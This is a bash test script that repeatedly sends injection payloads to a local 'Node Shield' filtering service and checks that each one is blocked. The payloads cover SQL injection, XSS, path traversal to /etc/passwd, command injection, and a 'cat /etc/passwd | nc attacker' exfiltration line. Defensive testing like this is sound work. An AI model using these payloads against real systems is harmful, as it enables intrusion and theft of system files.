#!/bin/bash

# Comprehensive Node Shield Testing with Docker Self-Healing
# Runs for 15 minutes, auto-fixes errors via docker-compose, restarts timer on failure

START_TIME=$(date +%s)
TIMEOUT=$((15 * 60))

PORT=${PORT:-3001}
BASE_URL="http://localhost:$PORT"

# Track successes
TOTAL_TESTS=0
PASSED_TESTS=0
FAILED_TESTS=0

test_attack() {
  local name="$1"
  local method="$2"
  local endpoint="$3"
  local data="$4"
  local expected_status="$5"

  TOTAL_TESTS=$((TOTAL_TESTS + 1))

  if [ "$method" = "GET" ]; then
    response=$(curl -s -w "\n%{http_code}" "$BASE_URL$endpoint" 2>&1)
  else
    response=$(curl -s -w "\n%{http_code}" -X "$method" "$BASE_URL$endpoint" \
      -H "Content-Type: application/json" \
      -d "$data" 2>&1)
  fi

  status=$(echo "$response" | tail -1)
  body=$(echo "$response" | head -n -1)

  if [ "$status" = "$expected_status" ]; then
    echo "✓ $name (HTTP $status)"
    PASSED_TESTS=$((PASSED_TESTS + 1))
    return 0
  else
    echo "✗ $name - Expected $expected_status, got $status"
    FAILED_TESTS=$((FAILED_TESTS + 1))
    return 1
  fi
}

test_clean_request() {
  TOTAL_TESTS=$((TOTAL_TESTS + 1))
  response=$(curl -s -w "\n%{http_code}" "$BASE_URL/search?q=admin" 2>&1)
  status=$(echo "$response" | tail -1)

  if [ "$status" = "200" ]; then
    echo "✓ Clean request passes through"
    PASSED_TESTS=$((PASSED_TESTS + 1))
    return 0
  else
    echo "✗ Clean request blocked (HTTP $status)"
    FAILED_TESTS=$((FAILED_TESTS + 1))
    return 1
  fi
}

check_api_health() {
  response=$(curl -s -w "\n%{http_code}" "$BASE_URL/api/stats" 2>&1)
  status=$(echo "$response" | tail -1)
  [ "$status" = "200" ] 2>/dev/null
  return $?
}

run_test_suite() {
  echo ""
  echo "=== Comprehensive Attack Injection Tests ==="
  echo "Time: $(date '+%H:%M:%S')"

  # Query Parameter Tests
  echo ""
  echo "Query Parameter Tests:"
  test_attack "SQL UNION SELECT" "GET" "/search?q=admin%27%20UNION%20SELECT%201--" "" "400"
  test_attack "SQL DROP TABLE" "GET" "/search?q=test;DROP%20TABLE%20users" "" "400"
  test_attack "SQL OR condition" "GET" "/search?q=1%27%20OR%20%271%27=%271" "" "400"
  test_attack "XSS Script Tag" "GET" "/search?q=%3Cscript%3E" "" "400"
  test_attack "XSS Event Handler" "GET" "/search?q=%3Cimg%20onerror=alert(1)%3E" "" "400"
  test_attack "Path Traversal Basic" "GET" "/search?file=..%2F..%2Fetc%2Fpasswd" "" "400"
  test_attack "Path Traversal Encoded" "GET" "/search?file=..%252F..%252Fetc" "" "400"
  test_attack "Command Injection Pipe" "GET" "/search?shell=ls%7Cwhoami" "" "400"
  test_attack "Command Injection AND" "GET" "/search?shell=test%20%26%26%20whoami" "" "400"

  # POST Body Tests
  echo ""
  echo "POST Body Tests:"
  test_attack "POST SQL OR" "POST" "/search" '{"search":"admin'"'"' OR 1=1"}' "400"
  test_attack "POST XSS" "POST" "/search" '{"msg":"<img src=x onerror=alert(1)>"}' "400"
  test_attack "POST RCE require" "POST" "/search" '{"code":"require('"'"'fs'"'"')"}' "400"
  test_attack "POST Command" "POST" "/search" '{"cmd":"cat /etc/passwd | nc attacker"}' "400"

  # Clean Requests
  echo ""
  echo "Valid Request Tests:"
  test_clean_request
  test_attack "Normal query" "GET" "/search?q=john&limit=10" "" "200"
}

# Main loop
echo "🛡️  NODE SHIELD 15-MINUTE SELF-HEALING TEST"
echo "Starting docker-compose verification..."
echo ""

# Initial docker check
if ! docker-compose ps 2>/dev/null | grep -q "node-shield\|postgres"; then
  echo "🔄 Starting docker-compose..."
  docker-compose up -d
  sleep 5
fi

while true; do
  CURRENT_TIME=$(date +%s)
  ELAPSED=$((CURRENT_TIME - START_TIME))

  if [ $ELAPSED -ge $TIMEOUT ]; then
    echo ""
    echo "╔════════════════════════════════════════════════════════════╗"
    echo "║     ✅ 15 MINUTE TEST COMPLETED SUCCESSFULLY              ║"
    echo "║  All attack vectors blocked consistently for 15 minutes    ║"
    echo "╚════════════════════════════════════════════════════════════╝"
    echo "Total: $TOTAL_TESTS | Passed: $PASSED_TESTS | Failed: $FAILED_TESTS"
    exit 0
  fi

  # Check API health
  if ! check_api_health; then
    echo ""
    echo "⚠️  API health check failed at $(date '+%H:%M:%S')"
    echo "🔄 Restarting docker-compose..."
    docker-compose restart
    sleep 5
    START_TIME=$(date +%s)
    TOTAL_TESTS=0
    PASSED_TESTS=0
    FAILED_TESTS=0
    continue
  fi

  # Run tests
  run_test_suite

  # Check results
  if [ $FAILED_TESTS -gt 0 ]; then
    echo ""
    echo "⚠️  Test failures detected at $(date '+%H:%M:%S')"
    echo "🔄 Restarting docker and resetting timer..."
    docker-compose restart
    sleep 5
    START_TIME=$(date +%s)
    TOTAL_TESTS=0
    PASSED_TESTS=0
    FAILED_TESTS=0
  else
    MINUTES_ELAPSED=$((ELAPSED / 60))
    SECONDS_ELAPSED=$((ELAPSED % 60))
    echo ""
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "✓ All tests passing - $MINUTES_ELAPSED:$(printf '%02d' $SECONDS_ELAPSED)/15:00"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  fi

  sleep 30
done
